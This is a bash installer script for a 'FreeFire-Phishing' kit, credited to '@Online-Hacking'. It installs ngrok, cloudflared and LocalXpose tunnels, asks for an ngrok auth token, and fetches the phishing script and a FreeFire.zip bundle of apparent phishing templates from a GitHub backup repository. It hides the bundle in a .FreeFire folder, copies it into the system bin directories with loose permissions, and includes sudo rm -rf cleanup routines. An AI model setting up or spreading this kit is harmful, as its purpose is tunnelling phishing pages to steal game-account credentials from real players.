#!/bin/bash
clear
#colors code
Black="\033[0;30m"
Red="\033[0;31m"
Green="\033[0;32m"
Yellow="\033[0;33m"
Blue="\033[0;34m"
Purple="\033[0;35m"
Cyan="\033[0;36m"
White="\033[0;37m"

#bold color code
BBlack="\033[1;30m"
BRed="\033[1;31m"
BGreen="\033[1;32m"
BYellow="\033[1;33m"
BBlue="\033[1;34m"
BPurple="\033[1;35m"
BCyan="\033[1;36m"
BWhite="\033[1;37m"

#reset 
Reset="\033[0m"

untermux() {
    echo
    rm -rf /data/data/com.termux/files/usr/bin/ngrok
    rm -rf /data/data/com.termux/files/usr/bin/cloudflared 
    rm -rf /data/data/com.termux/files/usr/bin/loclx
    rm -rf /data/data/com.termux/files/usr/bin/cloudflared
    rm -rf /data/data/com.termux/files/usr/bin/.FreeFire
    rm -rf /data/data/com.termux/files/usr/bin/.FreeFire/1 /data/data/com.termux/files/usr/bin/.FreeFire/2 /data/data/com.termux/files/usr/bin/.FreeFire/3 /data/data/com.termux/files/usr/bin/.FreeFire/4 /data/data/com.termux/files/usr/bin/.FreeFire/5 /data/data/com.termux/files/usr/bin/.FreeFire/6 /data/data/com.termux/files/usr/bin/.FreeFire/7 /data/data/com.termux/files/usr/bin/.FreeFire/8 /data/data/com.termux/files/usr/bin/.FreeFire/9 /data/data/com.termux/files/usr/bin/.FreeFire/0
    rm -rf /data/data/com.termux/files/usr/bin/FF
    rm -rf /data/data/com.termux/files/usr/bin/FreeFire
    rm -rf /data/data/com.termux/files/usr/bin/FreeFire-Phishing
    rm -rf /data/data/com.termux/files/usr/bin/OnlineHacking
    rm -rf FreeFire.zip

    echo -e ""
}

unlinux() {
    echo
    sudo rm -rf /usr/bin/ngrok
    sudo rm -rf /usr/bin/cloudflared 
    sudo rm -rf /usr/bin/loclx
    sudo rm -rf /usr/bin/cloudflared
    sudo rm -rf /usr/bin/.FreeFire
    sudo rm -rf /usr/bin/.FreeFire/1 /usr/bin/.FreeFire/2 /usr/bin/.FreeFire/3 /usr/bin/.FreeFire/4 /usr/bin/.FreeFire/5 /usr/bin/.FreeFire/6 /usr/bin/.FreeFire/7 /usr/bin/.FreeFire/8 /usr/bin/.FreeFire/9 /usr/bin/.FreeFire/0
    sudo rm -rf /usr/bin/FF
    sudo rm -rf /usr/bin/FreeFire
    sudo rm -rf /usr/bin/FreeFire-Phishing
    sudo rm -rf /usr/bin/OnlineHacking
    sudo rm -rf FreeFire.zip
    clear 
    echo -e ""
}
mainlogo(){
    echo ""
    echo -e "${Green}███████${Reset}╗${Green}██████${Reset}╗ ${Green}███████${Reset}╗${Green}███████${Reset}╗    ${Red}███████${Reset}╗${Red}██${Reset}╗${Red}██████${Reset}╗ ${Red}███████${Reset}╗ "
    echo -e "${Green}██${Reset}╔════╝${Green}██${Reset}╔══${Green}██${Reset}╗${Green}██${Reset}╔════╝${Green}██${Reset}╔════╝    ${Red}██${Reset}╔════╝${Red}██${Reset}║${Red}██${Reset}╔══${Red}██${Reset}╗${Red}██${Reset}╔════╝  "
    echo -e "${Green}█████${Reset}╗  ${Green}██████${Reset}╔${Reset}╝${Green}█████${Reset}╗  ${Green}█████${Reset}╗      ${Red}█████${Reset}╗  ${Red}██${Reset}║${Red}██████${Reset}╔${Reset}╝${Red}█████${Reset}╗  "
    echo -e "${Green}██${Reset}╔══╝  ${Green}██${Reset}╔══${Green}██${Reset}╗${Green}██${Reset}╔══╝  ${Green}██${Reset}╔══╝      ${Red}██${Reset}╔══╝  ${Red}██${Reset}║${Red}██${Reset}╔══${Red}██${Reset}╗${Red}██${Reset}╔══╝  "
    echo -e "${Green}██${Reset}║     ${Green}██${Reset}║  ${Green}██${Reset}║${Green}███████${Reset}╗${Green}███████${Reset}╗    ${Red}██${Reset}║     ${Red}██${Reset}║${Red}██${Reset}║  ${Red}██${Reset}║${Red}███████${Reset}╗"
    echo -e "${Reset}╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝    ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝"
    echo ""
    echo -e "            ${Yellow}[${Green}*${Yellow}] ${Green} https://github.com/CYB3RKING/FreeFire-Phishing "    
    echo -e "            ${Yellow}[${Green}*${Yellow}] ${Green} Credit -> ${Yellow}@Online-Hacking "
    echo ""                                                        
}
############################################################################################################
logo(){
    echo ""
    echo -e "${Green}███████ ██████  ███████ ███████    ${Red} ███████ ██ ██████  ███████ "
    echo -e "${Green}██      ██   ██ ██      ██         ${Red} ██      ██ ██   ██ ██      "
    echo -e "${Green}█████   ██████  █████   █████      ${Red} █████   ██ ██████  █████   "
    echo -e "${Green}██      ██   ██ ██      ██         ${Red} ██      ██ ██   ██ ██      "
    echo -e "${Green}██      ██   ██ ███████ ███████     ${Red}██      ██ ██   ██ ███████  "
    echo -e ""                                                       
}



install_ngrok() {
	if [[ -e "ngrok" ]]; then
		echo -e "\e[91m[\e[92m-\e[91m] \e[96m Ngrok already installed."
	else
		echo -e "\e[91m[\e[92m*\e[91m] \e[96m Installing Ngrok..."
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.tgz' 'ngrok'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz' 'ngrok'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz' 'ngrok'
		else
			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-386.tgz' 'ngrok'
		fi
	fi
}


install_cloudflared() {
   if [[ ! -e cloudflared ]]; then
        echo -e "${Green}[${Red}!${Green}] ${Yellow}Cloudflared not found. Installing${Reset}"
        command -v wget > /dev/null 2>&1 || { echo -e >&2 "${Green}[${Red}!${Green}] ${Yellow}I require wget but it's not installed. Install it. Aborting.${Reset}"; exit 1; }
        arch=$(uname -m)
        if [[ $arch == *'arm'* ]]; then
            wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared
        elif [[ "$arch" == *'aarch64'* ]]; then
            wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared
        elif [[ "$arch" == *'x86_64'* ]]; then
            wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared
        else
            wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O cloudflared
        fi
        chmod +x cloudflared
        clear
    fi
}

install_localxpose() {
	if [[ -e "loclx" ]]; then
		echo -e "\e[91m[\e[92m-\e[91m] \e[96m LocalXpose already installed."
	else
		echo -e "\e[91m[\e[92m*\e[91m] \e[96m Installing LocalXpose..."
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip' 'loclx'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip' 'loclx'
		else
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip' 'loclx'
		fi
	fi
}



ngroktoken() {
echo ""
echo -e "\e[93m 
 ███▄    █   ▄████  ██▀███   ▒█████   ██ ▄█▀
 ██ ▀█   █  ██▒ ▀█▒▓██ ▒ ██▒▒██▒  ██▒ ██▄█▒ 
▓██  ▀█ ██▒▒██░▄▄▄░▓██ ░▄█ ▒▒██░  ██▒▓███▄░ 
▓██▒  ▐▌██▒░▓█  ██▓▒██▀▀█▄  ▒██   ██░▓██ █▄ 
▒██░   ▓██░░▒▓███▀▒░██▓ ▒██▒░ ████▓▒░▒██▒ █▄
░ ▒░   ▒ ▒  ░▒   ▒ ░ ▒▓ ░▒▓░░ ▒░▒░▒░ ▒ ▒▒ ▓▒
░ ░░   ░ ▒░  ░   ░   ░▒ ░ ▒░  ░ ▒ ▒░ ░ ░▒ ▒░
   ░   ░ ░ ░ ░   ░   ░░   ░ ░ ░ ░ ▒  ░ ░░ ░ 
         ░       ░    ░         ░ ░  ░  ░   
\e[0m\n"
echo ""
echo ""
read -n1 -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Want to give \e[96mNgrok \e[32mAuth Token ? \e[1;91m (y/n) : \e[0m' option
echo""
echo""
echo""

if [[ $option == *'y'* ]]; then
clear
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  !!        Requirement Ngrok Token       !!\e[0m'
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
echo ""
echo""
echo -e "\e[31m[\e[32m*\e[31m]\e[33m Visit \e[32mngrok.com \e[m "
echo ""
echo -e "\e[31m[\e[32m*\e[31m]\e[33m Sign up & get ngrok authtoken \e[m "
echo ""
read -p $'\e[31m[\e[32m*\e[31m]\e[33m Input AuthToken Only \e[91m[Ex. \e[92m2cEG2LcBt**********WK5Ntc \e[92m] : \e[0m' token
./ngrok config add-authtoken $token
echo ""
fi
if [[ $option == *'n'* ]]; then
clear
fi
}


termux(){
    untermux
    rm -rf FreeFire-Phishing
    termux-setup-storage
    pkg install wget -y
    pkg install ncurses-utils -y
    apt install unzip -y
    apt install php -y
    apt install curl -y
    apt install openssh -y
    apt install ruby -y
    apt install jq -y
    apt install tail -y
    apt install zip -y
    clear
    sleep 2
    wget -q https://raw.githubusercontent.com/hackerx0007/backup/refs/heads/main/FF/Script/Android/FreeFire-Phishing -O FreeFire-Phishing > /dev/null
    clear
    sleep 2
    mainlogo
    echo
    echo -e "[+] Intsalling FreeFire-Phishing in Termux "
    echo -e ""
    echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
    echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;93m  !!         Download Link Services         !!\e[0m'
    echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
    echo ""
    sleep 2
    install_ngrok
    rm -rf ngrok-v3*.tgz
    echo ""
    install_cloudflared
    mv cloudflared-li* cloudflared
    echo ""
    install_localxpose
    rm -rf  loclx-linux*
    echo ""
    chmod +x loclx loclx*
    chmod +x cloudflared ngrok
    sleep 1
    echo""
    clear
    echo ""
    logo
    echo ""
    echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
    echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;96m  !!          DOWNLOAD TOOL FILE          !!\e[0m'
    echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
    echo ""
    wget -q --show-progress https://raw.githubusercontent.com/hackerx0007/backup/main/FF/zip/FreeFire.zip -O FreeFire.zip 
    sleep 2
    unzip FreeFire.zip
    mv FreeFire .FreeFire
    chmod +x ngrok
    chmod +x cloudflared
    chmod +x FF
    chmod +x FreeFire
    sleep 2
    clear
    cp -R cloudflared ngrok loclx .FreeFire/1/
    cp -R cloudflared ngrok loclx .FreeFire/2/
    cp -R cloudflared ngrok loclx .FreeFire/3/
    cp -R cloudflared ngrok loclx .FreeFire/4/
    cp -R cloudflared ngrok loclx .FreeFire/5/
    cp -R cloudflared ngrok loclx .FreeFire/6/
    cp -R cloudflared ngrok loclx .FreeFire/7/
    cp -R cloudflared ngrok loclx .FreeFire/8/
    cp -R cloudflared ngrok loclx .FreeFire/9/
    cp -R cloudflared ngrok loclx .FreeFire/0/
    chmod 7777 FreeFire-Phishing
    sleep 2
    clear
    ngroktoken
    echo
    sleep 2
    cp -R ngrok /data/data/com.termux/files/usr/bin
    cp -R cloudflared /data/data/com.termux/files/usr/bin
    cp -R loclx /data/data/com.termux/files/usr/bin
    cp -R .FreeFire /data/data/com.termux/files/usr/bin
    cp -R FF /data/data/com.termux/files/usr/bin
    cp -R FreeFire /data/data/com.termux/files/usr/bin
    cp -R FreeFire-Phishing /data/data/com.termux/files/usr/bin
    clear
    sleep 2
    echo
    rm -rf .Android-Setup.sh .FreeFire
    sleep 2
    echo
    clear
    logo
    echo -e "${Green}[${Yellow}+${Green}] ${Yellow}There CyberNinjaToolKit Tool Ready "
    echo
    echo
    echo -e "${Green}[${Yellow}+${Green}] ${Yellow}Now Type This Command:${Green} FreeFire-Phishing "
    echo
    exit

}

linux(){
    unlinux
    sleep 2
    rm -rf FreeFire-Phishing
    sudo apt-get install wget -y
    sudo apt-get install ncurses-utils -y
    sudo apt-get install unzip -y
    sudo apt-get install php -y
    sudo apt-get install curl -y
    sudo apt-get install openssh -y
    sudo apt-gett install ruby -y
    sudo apt-get install jq -y
    sudo apt-get install tail -y
    sudo apt-get install zip -y
    clear
    sleep 2
    sudo wget -q https://raw.githubusercontent.com/hackerx0007/backup/main/FF/Script/Linux/FreeFire-Phishing -O FreeFire-Phishing > /dev/null
    sleep 3
    clear
    mainlogo
    echo
    echo -e "[+] Intsalling FreeFire-Phishing in Linux "
    echo -e ""
    echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
    echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;93m  !!         Download Link Services         !!\e[0m'
    echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
    echo ""
    sleep 2
    install_ngrok
    rm -rf ngrok-v3*.tgz
    echo ""
    sleep 2
    install_cloudflared
    mv cloudflared-li* cloudflared
    echo ""
    sleep 2
    install_localxpose
    rm -rf  loclx-linux*
    echo ""
    sleep 2
    chmod +x loclx loclx*
    chmod +x cloudflared ngrok
    sleep 1
    echo""
    clear
    echo ""
    logo
    echo ""
    sleep 2
    echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
    echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;96m  !!          DOWNLOAD TOOL FILE          !!\e[0m'
    echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
    echo ""
    sleep 2
    wget -q --show-progress https://raw.githubusercontent.com/hackerx0007/backup/main/FF/zip/FreeFire.zip -O FreeFire.zip
    sleep 2
    unzip FreeFire.zip
    mv FreeFire .FreeFire
    chmod +x ngrok
    chmod +x cloudflared
    chmod +x FF
    chmod +x FreeFire
    clear
    sleep 2
    cp -R cloudflared ngrok loclx .FreeFire/1/
    cp -R cloudflared ngrok loclx .FreeFire/2/
    cp -R cloudflared ngrok loclx .FreeFire/3/
    cp -R cloudflared ngrok loclx .FreeFire/4/
    cp -R cloudflared ngrok loclx .FreeFire/5/
    cp -R cloudflared ngrok loclx .FreeFire/6/
    cp -R cloudflared ngrok loclx .FreeFire/7/
    cp -R cloudflared ngrok loclx .FreeFire/8/
    cp -R cloudflared ngrok loclx .FreeFire/9/
    cp -R cloudflared ngrok loclx .FreeFire/0/
    chmod 7777 FreeFire-Phishing
    clear
    sleep 2
    ngroktoken
    echo
    cp -R ngrok /usr/bin
    cp -R cloudflared /usr/bin
    cp -R loclx /usr/bin
    cp -R .FreeFire /usr/bin
    cp -R FF /usr/bin
    cp -R FreeFire /usr/bin
    cp -R FreeFire-Phishing /usr/bin
    sleep 2
    clear
    echo
    rm -rf .Android-Setup.sh .FreeFire
    sleep 2
    echo
    clear
    logo
    echo -e "${Green}[${Yellow}+${Green}] ${Yellow}There CyberNinjaToolKit Tool Ready "
    echo
    echo
    echo -e "${Green}[${Yellow}+${Green}] ${Yellow}Now Type This Command:${Green} FreeFire-Phishing "
    echo
    exit
}



setup() {
    mainlogo
    while true; do
        echo ""
        echo -e "${Green}[${Yellow}1${Green}] ${Cyan}Termux "
        echo -e "${Green}[${Yellow}2${Green}] ${Cyan}Linux "
        echo -e "${Green}[${Yellow}3${Green}] ${Cyan}Exit"
        echo "" 
        printf  " ${Yellow}Ninja  ${Cyan}-->  ${Green}"
        read option

        case $option in
            1)
                termux
                exit
                ;;
            2)
                linux
                exit
                ;;
            3)
                exit
                ;;
            *)
                echo "Invalid option. Please try again."
                ;;
        esac
    done
}

setup


